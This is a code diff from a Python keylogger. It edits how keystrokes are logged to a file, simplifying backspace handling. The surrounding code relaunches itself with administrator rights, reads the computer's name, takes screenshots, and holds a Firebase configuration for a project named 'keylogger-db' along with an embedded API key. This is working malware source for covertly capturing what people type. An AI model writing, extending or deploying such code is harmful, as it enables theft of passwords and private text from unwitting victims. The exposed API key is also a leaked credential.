@@ -35,7 +35,6 @@ if not is_admin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
     os._exit(1)
 
-
 config = {
     'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
     'authDomain': "keylogger-db.firebaseapp.com",
@@ -56,7 +55,6 @@ f = open('data.txt', 'w', encoding='utf-8')
 
 data = ''
 lastThreeKeys = []
-countDelete = 0
 clicks_counter = 0
 imgPath = 'screenshot.jpg'
 pcName = os.environ['COMPUTERNAME']
@@ -91,40 +89,31 @@ def on_press(key):
 
 
 def printKey(key):
-    global data, countDelete, f
+    global data, f
 
     try:
         if str(key) == 'Key.enter':
-            countDelete = 0
             data += '\n'
             print('\n')
             f.write('\n')
 
-        elif str(key) == 'Key.backspace' and len(data) > 0:  # needs fixing !
-            countDelete += 1
-            if countDelete > 1:
-                data = data[:-countDelete * 2 + 1] + str(data[-countDelete * 2 + 1] + '\u0336') \
-                       + data[-countDelete * 2 + 2:]
-            else:
-                data = data[:-countDelete] + str(data[-countDelete] + '\u0336')
+        elif str(key) == 'Key.backspace' and len(data) > 0:  
+            data = data[:-1]
             f.close()
             f = open('data.txt', 'w', encoding='utf-8')
             f.write(data)
 
         elif str(key) == 'Key.space':
-            countDelete = 0
             data += ' '
             print(' ')
             f.write(' ')
 
         elif str(key) == 'Key.tab':
-            countDelete = 0
             data += '\t'
             print('\t')
             f.write('\t')
 
         elif hasattr(key, 'char'):
-            countDelete = 0
             data += key.char
             print(key.char)
             f.write(key.char)
